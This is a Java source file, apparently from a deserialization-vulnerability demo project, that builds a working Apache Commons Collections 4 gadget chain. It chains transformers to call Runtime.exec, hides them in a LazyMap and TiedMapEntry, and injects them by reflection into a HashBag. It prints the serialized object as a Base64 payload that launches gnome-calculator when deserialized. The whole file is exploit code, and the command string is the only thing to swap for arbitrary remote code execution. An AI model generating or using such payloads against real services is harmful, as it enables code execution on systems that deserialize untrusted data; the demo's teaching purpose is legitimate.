package tech.woodandsafety.unserialjavademo.vulnbin;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.AbstractMapBag;
import org.apache.commons.collections4.bag.HashBag;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class CommonsExploit {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException {

        @SuppressWarnings("unchecked") ChainedTransformer<Object> transformers = new ChainedTransformer<Object>(new Transformer[]{
            new ConstantTransformer<Class<Runtime>, Class<Runtime>>(Runtime.class),
            new InvokerTransformer<Class<Runtime>, Method>("getMethod", new Class<?>[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
            new InvokerTransformer<Method, Runtime>("invoke", new Class<?>[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
            new InvokerTransformer<Runtime, Object>("exec", new Class<?>[]{String.class}, new Object[]{"gnome-calculator"})
        });

        LazyMap<String, Object> runtimeGet = LazyMap.lazyMap(new HashMap<>(), transformers);

        TiedMapEntry<String, Object> tme = new TiedMapEntry<>(runtimeGet, "I'm just some innocent chars...");

        HashBag<Object> bag = new HashBag<>();
        bag.add(0);

        Field mapField = AbstractMapBag.class.getDeclaredField("map");
        mapField.setAccessible(true);
        Map map = (Map) mapField.get(bag);

        Field tableField = HashMap.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] nodes = (Object[]) tableField.get(map);

        Object node = Arrays.stream(nodes)
                .filter(Objects::nonNull)
                .findFirst()
                .orElseThrow(() -> new RuntimeException("this can't happen"));


        Class<?> NodeClass = HashMap.class.getDeclaredClasses()[13];
        Field keyField = NodeClass.getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, tme);

        mapField.setAccessible(false);
        tableField.setAccessible(false);
        keyField.setAccessible(false);

        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(bos)
                ) {
            oos.writeObject(bag);
            System.out.println(new String(Base64.getEncoder().encode(bos.toByteArray())));
        }
    }

    public void commandExample() throws IOException {
        Runtime.getRuntime().exec("gnome-calculator");
    }

}
